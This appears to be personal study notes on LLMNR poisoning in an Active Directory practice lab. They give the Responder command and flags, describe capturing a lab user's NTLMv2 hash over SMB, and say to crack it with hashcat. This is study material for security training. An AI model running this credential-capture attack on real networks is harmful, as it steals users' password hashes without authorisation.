#llmnrpoisoining
#linklocalmulticastnameresolution

# LLMNR Poisoning

- Used to identify hosts when DNS failed to do so
- Previously NBT-NS
- The key flaw is that the service utilizes a user's username and NTLMv2 hash when appropriately responding to
- Previously known as MBTNS (for older networks)
- Can capture username and hash using MITM
- respond to traffic
- shared folder (LLMNR enabled)
- can attack early morning/after lunch
- enabled by default in a network
![[Pasted image 20240711192802.png]]
#ADattackllmnrcommand
Command to be executed in kali: `sudo responder  -I eth0 -dwPv`
where:
I - interface (VPN,tun0) (eth0 if network)
d- DHCP/DNS (listening to DHCP broadcast request)
w- wpad
P - ProxyAuth
v - verbose
it senses traffic and grabs the hash
We will see hash come through 
take the hash and use `hashcat` to crack it

#respondertool
If you execute `sudo responder --help`, you will get to know several options

Make sure the following (e.g http, SMB) are "ON" but by default, they must be "ON"

![[Pasted image 20240711195044.png]]

As see here, its listening DHCP events

![[Pasted image 20240711195155.png]]

- Sign In to Punisher machine using fcastle while the kali reposnder is "ON"
- Access the attacker's machine in the file explorer using `\\192.168.64.4`
- While accessing the attacker's machine using SMB, we were able to capture the hash
Image of the Punisher's machine while accessing `\\192.168.64.4`

![[Pasted image 20240711195727.png]]

Image of the kali machine while the responder is "ON". 

![[Pasted image 20240711195645.png]]

- Use hashcat